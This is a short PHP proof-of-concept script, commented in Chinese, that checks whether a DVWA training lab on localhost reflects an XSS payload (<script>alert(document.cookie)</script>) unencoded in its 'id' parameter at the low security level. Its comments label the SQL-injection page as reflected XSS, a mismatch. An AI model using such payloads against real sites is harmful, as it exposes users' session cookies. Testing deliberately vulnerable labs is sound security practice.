<?php
// xss_r_low_poc.php — 反射型 XSS 验证脚本 (vulnerabilities/sqli, low 安全等级)
// DVWA 反射型 XSS：输入 $_REQUEST['id'] 未经编码即拼入 <pre>ID: {$id}...</pre>

$TARGET = 'http://127.0.0.1/vulnerabilities/sqli/index.php';
$PHPSESSID = 'REPLACE_WITH_VALID_LOGIN_SESSION_ID';
$security  = 'low';                    // low 等级时路径可达（index.php:19-20 选择 low.php）
define('DVWA_WEB_PAGE_TO_ROOT', '');   // 仅为让脚本自述清晰，实际运行用 HTTP 请求

function fetch($url, $cookies, $params) {
    $query = http_build_query($params);
    $ctx = stream_context_create(array(
        'http' => array(
            'method' => 'GET',
            'header' => "Cookie: " . implode('; ', $cookies) . "\r\n" .
                        "User-Agent: poc-script\r\n" .
                        "Connection: close\r\n",
            'timeout' => 15,
        )
    ));
    return @file_get_contents($url . '?' . $query, false, $ctx);
}

$cookies = array("PHPSESSID={$PHPSESSID}", "security={$security}");

// ---- 正常输入（对照）----
$normal = fetch($TARGET, $cookies, array('Submit' => 'Submit', 'id' => '1'));
// ---- 攻击输入（反射型 XSS）----
$attack = fetch($TARGET, $cookies, array('Submit' => 'Submit', 'id' => "1'><script>alert(document.cookie)</script>"));

// 判定：原始攻击串是否未经编码出现在响应中
$needle = "1'><script>alert(document.cookie)</script>";
textlocate($normal, $attack, $needle);

function textlocate($normal, $attack, $needle) {
    $nBlock = (strpos((string)$normal, $needle) !== false);
    $aBlock = (strpos((string)$attack, $needle) !== false);

    echo "[NORMAL] id=1 : " . ($nBlock ? "RAW_PAYLOAD_PRESENT(见攻击串)" : "RAW_PAYLOAD_ABSENT") . "\n";
    echo "[ATTACK] id=payload : " . ($aBlock ? "RAW_PAYLOAD_REFLECTED (XSS_TRIGGERED)" : "RAW_PAYLOAD_NOT_REFLECTED") . "\n";

    echo "\n--- 攻击响应片段（前 400 字节）---\n";
    echo substr((string)$attack, 0, 400);
    echo "\n--- 结束 ---\n";
}
